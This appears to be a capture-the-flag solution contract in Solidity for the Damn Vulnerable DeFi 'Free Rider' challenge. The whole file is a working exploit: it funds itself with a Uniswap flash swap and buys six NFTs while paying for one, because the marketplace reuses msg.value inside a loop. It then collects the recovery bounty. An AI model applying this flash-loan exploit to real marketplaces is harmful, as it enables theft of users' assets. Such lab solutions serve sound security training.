// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {WETH} from "solmate/tokens/WETH.sol";
import {FreeRiderNFTMarketplace} from "../free-rider/FreeRiderNFTMarketplace.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

contract AttackFreeRider is IERC721Receiver {
    address public player;
    FreeRiderNFTMarketplace public freeRiderNFTMarketplace;
    address public freeRiderRecoveryManager;
    address public freeRiderRecoveryManagerOwner;
    IUniswapV2Pair public pool;
    WETH public weth;
    DamnValuableNFT public nft;

    constructor(
        address _player,
        address payable _freeRiderNFTMarketplace,
        address _freeRiderRecoveryManager,
        address _freeRiderRecoveryManagerOwner,
        address _pool,
        address payable _weth,
        address _nft
    ) {
        player = _player;
        freeRiderNFTMarketplace = FreeRiderNFTMarketplace(
            _freeRiderNFTMarketplace
        );
        freeRiderRecoveryManager = _freeRiderRecoveryManager;
        freeRiderRecoveryManagerOwner = _freeRiderRecoveryManagerOwner;
        pool = IUniswapV2Pair(_pool);
        weth = WETH(_weth);
        nft = DamnValuableNFT(_nft);
    }

    function attack() external {
        if (pool.token0() == address(weth)) {
            pool.swap(15 ether, 0, address(this), abi.encode("flashLoan"));
        } else {
            pool.swap(0, 15 ether, address(this), abi.encode("flashLoan"));
        }
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory _data
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function uniswapV2Call(
        address,
        uint256,
        uint256 _amount1,
        bytes calldata _data
    ) external {
        weth.withdraw(15 ether);

        uint256[] memory tokenIds = new uint256[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;

        freeRiderNFTMarketplace.buyMany{value: 15 ether}(tokenIds);

        for (uint256 i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(
                address(this),
                freeRiderRecoveryManager,
                tokenIds[i],
                abi.encode(player)
            );
        }

        weth.deposit{value: 20 ether}();
        weth.transfer(address(pool), 20 ether);

        payable(player).transfer((address(this).balance));
    }

    receive() external payable {}
}
